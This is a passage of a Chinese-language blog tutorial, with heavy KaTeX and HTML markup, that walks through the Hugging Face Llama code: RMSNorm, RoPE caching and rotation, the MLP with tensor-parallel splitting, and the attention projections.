style="height:0.2997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.1951em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.88em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.88em" viewBox="0 0 400000 1944" preserveAspectRatio="xMinYMin slice"><path d="M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6049em;"><span></span></span></span></span></span></span></span></span>以及<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mover accent="true"><mi>a</mi><mo>ˉ</mo></mover><mi>i</mi></msub><mo>=</mo><mfrac><msub><mi>a</mi><mi>i</mi></msub><mrow><mi>R</mi><mi>M</mi><mi>S</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo></mrow></mfrac><msub><mi>g</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\bar{a}_i = \frac{a_i}{RMS(a)}g_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7178em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">a</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2315em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7115em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">RMS</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">a</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。第13、14行将输入的 <code>hidden_states</code>（隐藏状态张量）的最低维度元素，进行平方后取平均，再用 <code>rsqrt</code> 取倒数开根号，最后更新 <code>hidden_states</code> 的值。之后我们会了解到，所谓的最低维度就是张量的特征值 （即 feature 维度）。</p><h3 id="激活函数">激活函数</h3><p>transformers 的激活函数实现集中在另一个 <a href="https://github.com/huggingface/transformers/blob/main/src/transformers/activations.py">python 文件</a>中，离我们要讨论的 llama 比较远，实现也较为平凡，不细聊。这里只说明默认使用的是 <a href="https://pytorch.org/docs/stable/generated/torch.nn.SiLU.html"><code>nn.SiLU</code> 激活函数</a></p><h3 id="RoPE">RoPE</h3><center>  <img src="/img/LLM/RoPE3.png" ></center><p>从上节内容中，我们知道 RoPE 旋转位置编码在推理时的计算过程如上图（这里我们把 <code>x</code> 换成了 transformer 中更常用的 <code>q</code>）。那么关于旋转位置编码的运算，在实际代码中是如何完成的呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LlamaRotaryEmbedding</span>(nn.Module):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, dim, max_position_embeddings=<span class="hljs-number">2048</span>, base=<span class="hljs-number">10000</span>, device=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-built_in">super</span>().__init__()<br><br>    self.dim = dim<br>    self.max_position_embeddings = max_position_embeddings<br>    self.base = base<br>    inv_freq = <span class="hljs-number">1.0</span> / (self.base ** (torch.arange(<span class="hljs-number">0</span>, self.dim, <span class="hljs-number">2</span>).<span class="hljs-built_in">float</span>().to(device) / self.dim))<br>    self.register_buffer(<span class="hljs-string">&quot;inv_freq&quot;</span>, inv_freq, persistent=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-comment"># Build here to make `torch.jit.trace` work.</span><br>    self._set_cos_sin_cache(<br>        seq_len=max_position_embeddings, device=self.inv_freq.device, dtype=torch.get_default_dtype()<br>    )<br></code></pre></td></tr></table></figure><p>首先，<code>LlamaRotaryEmbedding</code> 在构造函数中就将公式中的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>θ</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\theta_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>存入到 <code>nn.Module </code> 中的 <a href="https://pytorch.org/docs/stable/generated/torch.nn.Module.html#torch.nn.Module.register_buffer">register_buffer</a>。然后调用内部函数将 cos 和 sin 值算出来👇：详细地，<a href="https://pytorch.org/docs/stable/generated/torch.einsum.html">torch.einsum</a> 计算了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><msub><mi>θ</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">m\theta_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，就如论文中配图所示的过程那样（下图，代码中的 t 就是图里的 m），将角度与词的绝对位置相乘，就相当于在平面坐标系上转了一个小角度。最后，将这些值在最低维复制一次，拼接起来（<code>torch.cat</code>），便得到了制备的 cos 和 sin 值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_set_cos_sin_cache</span>(<span class="hljs-params">self, seq_len, device, dtype</span>):<br>  self.max_seq_len_cached = seq_len<br>  t = torch.arange(self.max_seq_len_cached, device=device, dtype=self.inv_freq.dtype)<br><br>  freqs = torch.einsum(<span class="hljs-string">&quot;i,j-&gt;ij&quot;</span>, t, self.inv_freq)<br>  <span class="hljs-comment"># Different from paper, but it uses a different permutation in order to obtain the same calculation</span><br>  emb = torch.cat((freqs, freqs), dim=-<span class="hljs-number">1</span>)<br>  self.register_buffer(<span class="hljs-string">&quot;cos_cached&quot;</span>, emb.cos().to(dtype), persistent=<span class="hljs-literal">False</span>)<br>  self.register_buffer(<span class="hljs-string">&quot;sin_cached&quot;</span>, emb.sin().to(dtype), persistent=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><center>  <img src="/img/LLM/RoPE4.png" ></center><p>这样做的好处是，所有的 cos 和 sin 值都在程序构造该类时已经计算完成，推理时无需再次计算，加快了推理过程。那么，另一个问题是：在真实的推理中，llama 是如何使用这些已经制备的 cos 和 sin 的？来看下面的代码👇：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate_half</span>(<span class="hljs-params">x</span>):<br>  <span class="hljs-string">&quot;&quot;&quot;Rotates half the hidden dims of the input.&quot;&quot;&quot;</span><br>  x1 = x[..., : x.shape[-<span class="hljs-number">1</span>] // <span class="hljs-number">2</span>]<br>  x2 = x[..., x.shape[-<span class="hljs-number">1</span>] // <span class="hljs-number">2</span> :]<br>  <span class="hljs-keyword">return</span> torch.cat((-x2, x1), dim=-<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">apply_rotary_pos_emb</span>(<span class="hljs-params">q, k, cos, sin, position_ids, unsqueeze_dim=<span class="hljs-number">1</span></span>):<br>  cos = cos[position_ids].unsqueeze(unsqueeze_dim)<br>  sin = sin[position_ids].unsqueeze(unsqueeze_dim)<br>  q_embed = (q * cos) + (rotate_half(q) * sin)<br>  k_embed = (k * cos) + (rotate_half(k) * sin)<br>  <span class="hljs-keyword">return</span> q_embed, k_embed<br><br><span class="hljs-comment"># forward for LlamaRotaryEmbedding</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x, seq_len=<span class="hljs-literal">None</span></span>):<br>  <span class="hljs-comment"># x: [bs, num_attention_heads, seq_len, head_size]</span><br>  <span class="hljs-keyword">if</span> seq_len &gt; self.max_seq_len_cached:<br>      self._set_cos_sin_cache(seq_len=seq_len, device=x.device, dtype=x.dtype)<br><br>  <span class="hljs-keyword">return</span> (<br>      self.cos_cached[:seq_len].to(dtype=x.dtype),<br>      self.sin_cached[:seq_len].to(dtype=x.dtype),<br>  )<br></code></pre></td></tr></table></figure><p>之后会提到，<code>apply_rotary_pos_emb</code> 函数在 <code>LlamaModel:forward</code> 中被调用，计算位置编码。下图公式的第一项和第二项对应代码里的 <code>(q * cos)</code>，注意到 <code>cos</code> 已通过 <a href="https://pytorch.org/docs/stable/generated/torch.unsqueeze.html#torch.unsqueeze">torch.unsqueeze</a> 列向排布。而公式中的第三项需要靠 <code>rotate_half</code> 获得，方法是切半，旋转，取负，于是得到了下图的运算过程。注意看，虽然论文中描述的公式与下图稍有不同，但其本质仍是一样的。而下图的运算过程能被处理得更加快捷。</p><center>  <img src="/img/LLM/RoPE1.png" ></center><h4 id="RoPE-扩展">RoPE 扩展</h4><h2 id="llama-中间件">llama 中间件</h2><p>后续内容可能会涉及到 llama 的相关超参。下面的数据是 llama-7b-hf 的 config 数据，后续的内容会对这些参数做具体说明：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;architecture&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;LlamaForCausalLM&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;hidden_act&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;silu&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;hidden_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4096</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;initializer_range&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.02</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;intermediate_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">11008</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;max_position_embeddings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4096</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;model_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;llama&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;num_attention_heads&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;num_hidden_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;num_key_value_heads&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;pretraining_tp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;rms_norm_eps&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1e-05</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="MLP">MLP</h3><p>llama 内使用了两层深的 <a href="https://www.3blue1brown.com/lessons/neural-networks">MLP</a> 来存储参数，相对简单。该网络先将维度从 <code>hidden_size</code> 映射到 <code>intermediate_size</code>，再将它降维映射到 <code>hidden_size</code>。具体流程和架构参考下图：</p><center>  <img src="/img/LLM/llamaMLP.png" ></center><p>代码中需要注意的是 <code>pretraining_tp</code> 部分，它通过将<strong>张量的某一维度简单地均分</strong>以实现张量并行（Tensor Parallelism，TP）。例如，第13-17行将线性层的权重矩阵在 <code>intermediate_size</code> 维均分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LlamaMLP</span>(nn.Module):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config</span>):<br>    <span class="hljs-built_in">super</span>().__init__()<br>    self.config = config<br>    self.hidden_size = config.hidden_size<br>    self.intermediate_size = config.intermediate_size<br>    self.gate_proj = nn.Linear(self.hidden_size, self.intermediate_size, bias=<span class="hljs-literal">False</span>)<br>    self.up_proj = nn.Linear(self.hidden_size, self.intermediate_size, bias=<span class="hljs-literal">False</span>)<br>    self.down_proj = nn.Linear(self.intermediate_size, self.hidden_size, bias=<span class="hljs-literal">False</span>)<br>    self.act_fn = ACT2FN[config.hidden_act]<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>    <span class="hljs-keyword">if</span> self.config.pretraining_tp &gt; <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">slice</span> = self.intermediate_size // self.config.pretraining_tp<br>        gate_proj_slices = self.gate_proj.weight.split(<span class="hljs-built_in">slice</span>, dim=<span class="hljs-number">0</span>)<br>        up_proj_slices = self.up_proj.weight.split(<span class="hljs-built_in">slice</span>, dim=<span class="hljs-number">0</span>)<br>        down_proj_slices = self.down_proj.weight.split(<span class="hljs-built_in">slice</span>, dim=<span class="hljs-number">1</span>)<br><br>        gate_proj = torch.cat(<br>            [F.linear(x, gate_proj_slices[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.config.pretraining_tp)], dim=-<span class="hljs-number">1</span><br>        )<br>        up_proj = torch.cat([F.linear(x, up_proj_slices[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.config.pretraining_tp)], dim=-<span class="hljs-number">1</span>)<br><br>        intermediate_states = (self.act_fn(gate_proj) * up_proj).split(<span class="hljs-built_in">slice</span>, dim=<span class="hljs-number">2</span>)<br>        down_proj = [<br>            F.linear(intermediate_states[i], down_proj_slices[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.config.pretraining_tp)<br>        ]<br>        down_proj = <span class="hljs-built_in">sum</span>(down_proj)<br>    <span class="hljs-keyword">else</span>:<br>        down_proj = self.down_proj(self.act_fn(self.gate_proj(x)) * self.up_proj(x))<br><br>    <span class="hljs-keyword">return</span> down_proj<br></code></pre></td></tr></table></figure><p>下面这张图展示了 TP 下计算过程，在 <code>intermediate_size</code> 较大时，使用TP对该维度进行均分，可以很好地加速推理过程：MLP 的输入张量 <code>x</code> 在 TP 模式下会在 <code>seq_len</code> 这个维度下被均分成若干子矩阵；每个子矩阵 <code>(seq_len / TP, hidden_size)</code> 都会参与 gate 和 up_proj 的线性层运算，与权重矩阵 <code>(intermediate_size / TP, hidden_size)^T</code> 相乘，得到结果经拼接后，再将分别按位相乘得到中间状态张量 <code>intermediate_states</code>；最后中间状态张量通过 down_proj 线性层得到输出张量。</p><center>  <img src="/img/LLM/MLPTP.png"></center><h3 id="Attention">Attention</h3><p>注意力机制比较复杂，首先来看一下 <code>LlamaAttention</code> 的构造函数：<code>num_heads</code> 表示注意力头的数量，<code>head_dim</code> 表示注意力头的维度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LlamaAttention</span>(nn.Module):<br>  <span class="hljs-string">&quot;&quot;&quot;Multi-headed attention from &#x27;Attention Is All You Need&#x27; paper&quot;&quot;&quot;</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config: LlamaConfig</span>):<br>    <span class="hljs-built_in">super</span>().__init__()<br>    self.config = config<br>    self.hidden_size = config.hidden_size<br>    self.num_heads = config.num_attention_heads<br>    self.head_dim = self.hidden_size // self.num_heads<br>    self.num_key_value_heads = config.num_key_value_heads<br>    self.num_key_value_groups = self.num_heads // self.num_key_value_heads<br>    self.max_position_embeddings = config.max_position_embeddings<br>    self.rope_theta = config.rope_theta<br>    self.is_causal = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">if</span> (self.head_dim * self.num_heads) != self.hidden_size:<br>        <span class="hljs-keyword">raise</span> ValueError(<br>            <span class="hljs-string">f&quot;hidden_size must be divisible by num_heads (got `hidden_size`: <span class="hljs-subst">&#123;self.hidden_size&#125;</span>&quot;</span><br>            <span class="hljs-string">f&quot; and `num_heads`: <span class="hljs-subst">&#123;self.num_heads&#125;</span>).&quot;</span><br>        )<br>    self.q_proj = nn.Linear(self.hidden_size, self.num_heads * self.head_dim, bias=config.attention_bias)<br>    self.k_proj = nn.Linear(self.hidden_size, self.num_key_value_heads * self.head_dim, bias=config.attention_bias)<br>    self.v_proj = nn.Linear(self.hidden_size, self.num_key_value_heads * self.head_dim, bias=config.attention_bias)<br>    self.o_proj = nn.Linear(self.num_heads * self.head_dim, self.hidden_size, bias=config.attention_bias)<br>    self._init_rope()<br></code></pre></td></tr></table></figure><p>注意到 <code>q_proj</code> <code>k_proj</code> <code>v_proj</code> <code>o_proj</code> 四个线性层的维度，之后的 TP 会将他们在 <code>hidden_size</code> 拆分，它们的权重张量分别是：</p><ul><li><code>q_proj</code>: <code>(num_heads * head_dim, hidden_size)^T</code></li><li><code>k_proj</code>: <code>(num_key_value_heads * head_dim, hidden_size)^T</code></li><li><code>v_proj</code>: <code>(num_key_value_heads * head_dim, hidden_size)^T</code></li><li><code>o_proj</code>: <code>(hidden_size, num_heads * head_dim)^T</code></li></ul><p>在咱们的 llama-7b-hf 的例子中，注意力头数量较少，因此只有一组注意力头。若注意力头数量较多，llama2 使用分组和 <a href="https://arxiv.org/pdf/2305.13245">grouped-query attention</a> 机制，使得同一组的 Q 共享一个 KV 权重，减少内存使用，进一步优化推理性能。</p><p><img src="/img/LLM/The-Transformers-architecture-Multi-Head-Attention-consists-of-several-attention-layers.ppm" alt=""></p><h4 id="forward-实现">forward 实现</h4><p>forward 函数的实现通常比较复杂，但也有一些简单的小技巧：每次在阅读 <code>forward</code> 函数前，都需要问问自己：正在执行运算的张量维度是什么？张量的维度能很好地帮助我们找到代码中隐藏的蛛丝马迹，更好地读懂这些 python 代码，不迷失在细节之海中。</p><p>首先，确认我们的输入张量 <code>hidden_states</code> 的维度：<code>(batch_size, seq_len, hidden_size)</code>。而 QKV 三个权重矩阵的维度也可以从上节线性层初始化中确认，分别是 <code>(num_heads*head_dim, hidden_size)</code>、<code>(num_key_value_heads*head_dim, hidden_size)</code> 和 <code>(num_key_value_heads*head_dim, hidden_size)</code>。在我们的例子中，kv_groups 为1，因此这三个权重矩阵的维度是一样的。</p><p><strong>qkv 状态张量</strong></p><p>现在来细看一下 咱们是如何切分这些状态张量以实现 TP 的，其实与上文的 MLP 实现极为类似，都是将输入张量的高维均分进行并行计算。第15-17行，query 在最高维度将权重一切为二，18-19 行 key 和 value 也是如此；21-28行，将 <code>hidden_states</code>（就是输入）与 query 权重相乘，TP 并行计算完后在最后一个维度上合并，同理于 key 和 value。忽略最高维的 <code>batch_size</code>，具体运算公式如下：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi><mo>=</mo><msub><mi>H</mi><mrow><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>h</mi><mi>i</mi><mi>d</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow></msub><msubsup><mi>Q</mi><mrow><mi>n</mi><mi>u</mi><mi>m</mi><mi mathvariant="normal">_</mi><mi>h</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi>s</mi><mo>∗</mo><mi>h</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>d</mi><mi>i</mi><mi>m</mi><mo separator="true">,</mo><mi>h</mi><mi>i</mi><mi>d</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><mi>T</mi></msubsup></mrow><annotation encoding="application/x-tex">query = H_{seq\_ len, hidden\_size} Q_{num\_heads*head\_dim, hidden\_size}^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.03588em;">ery</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.3553em;vertical-align:-0.464em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">se</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mord mtight" style="margin-right:0.02778em;">_</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">hi</span><span class="mord mathnormal mtight">dd</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mord mtight" style="margin-right:0.02778em;">_</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">ze</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.367em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">m</span><span class="mord mtight" style="margin-right:0.02778em;">_</span><span class="mord mathnormal mtight">h</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">s</span><span class="mbin 